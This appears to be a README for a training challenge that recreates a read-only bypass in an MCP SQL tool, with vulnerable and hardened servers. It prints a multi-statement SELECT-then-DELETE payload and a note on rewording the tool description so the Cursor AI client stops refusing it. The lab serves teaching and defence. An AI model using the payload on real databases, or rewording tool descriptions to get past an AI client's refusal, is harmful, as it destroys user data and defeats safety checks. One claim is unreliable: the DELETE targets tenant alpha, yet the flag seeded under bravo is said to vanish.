# Challenge 04: Xata Read-Only Bypass

This scenario recreates the xata-mcp vulnerability disclosed by Node.js Security. The MCP server proxies user-supplied SQL to a Postgres read replica and assumes that `client.query()` only executes a single SELECT statement. In reality, the Postgres driver happily executes multiple statements separated by semicolons, so an attacker can inject a destructive command even though the tool advertises "read-only" semantics.

## Services

- `xata-db` - PostgreSQL 15 preloaded with `tenant_documents` containing `FLAG{readonly_bypass_success}`.
- `xata-readonly-bypass-vulnerable` - MCP tool `run_query(sql)` that only checks `sql.lower().startswith("select")` before forwarding the entire payload to Postgres.
- `xata-readonly-bypass-secure` - Hardened tool that uses `sqlparse` to enforce exactly one SELECT statement (rejects semicolons/multiple statements).

## Running the Challenge

```bash
cd challenges/04-xata-readonly-bypass
python -m venv .venv && source .venv/bin/activate  # optional
pip install -r requirements.txt

# Vulnerable server
PG_DSN=postgresql://mcp:password@localhost:5440/xata python vulnerable/server.py

# Secure server
PG_DSN=postgresql://mcp:password@localhost:5440/xata python secure/server.py
```

### Docker Compose

```bash
docker compose up xata-db
# in separate terminals
docker compose up xata-readonly-bypass-vulnerable
docker compose up xata-readonly-bypass-secure
```

## Exploit Walkthrough (Cursor-Friendly)

1. Connect Cursor to `xata-readonly-bypass-vulnerable` at `http://localhost:8020/mcp/stream`.
2. Call `run_query` with a benign SELECT:
   ```json
   {
     "tool": "run_query",
     "arguments": {"sql": "SELECT * FROM tenant_documents"}
   }
   ```
   The server returns both rows, proving read access works.
3. Bypass read-only mode by running a multi-statement payload (still starting with `SELECT` so the MCP client allows it):
   ```json
   {
     "tool": "run_query",
     "arguments": {
       "sql": "SELECT * FROM tenant_documents; DELETE FROM tenant_documents WHERE tenant='alpha';"
     }
   }
   ```
   Because the vulnerable server forwards the entire string, Postgres executes both statements. The first SELECT returns rows, and the subsequent DELETE removes tenant `alpha`'s data even though the tool claimed to be read-only.
4. Repeat against `xata-readonly-bypass-secure` (`http://localhost:9020/mcp/stream`). The secure tool rejects the payload with "Rejected: Only a single statement is permitted" and the database contents remain intact.

> **LLM quirk:** During testing, Cursor initially refused to run the multi-statement payload because the tool description literally said "Execute a SELECT query against the read-only replica." The client inferred that DELETE/INSERT were off-limits and blocked the request before it ever hit the server. Updating the tool description to the more generic "Execute an SQL query routed to the replica" removed that obstacle, allowing the exploit to reach the vulnerable backend. Keep that in mind when reproducing the issue with other LLM clients: overly specific descriptors can prevent you from exercising the bug.

## Secure Design Principles Demonstrated

- **Single-statement enforcement** - Split incoming SQL and reject multiple statements or non-SELECT commands.
- **Driver-aware safeguards** - Do not rely on `client.query()` to limit execution; implement server-side validation or use database roles with `default_transaction_read_only = on`.
- **Auditing** - The secure server logs rejected attempts so operators can investigate suspicious clients.

The sample Postgres instance is seeded with `FLAG{readonly_bypass_success}` under tenant `bravo`. After running the exploit, the flag is gone, demonstrating that a "read-only" MCP tool can still mutate data when multiple statements are forwarded.
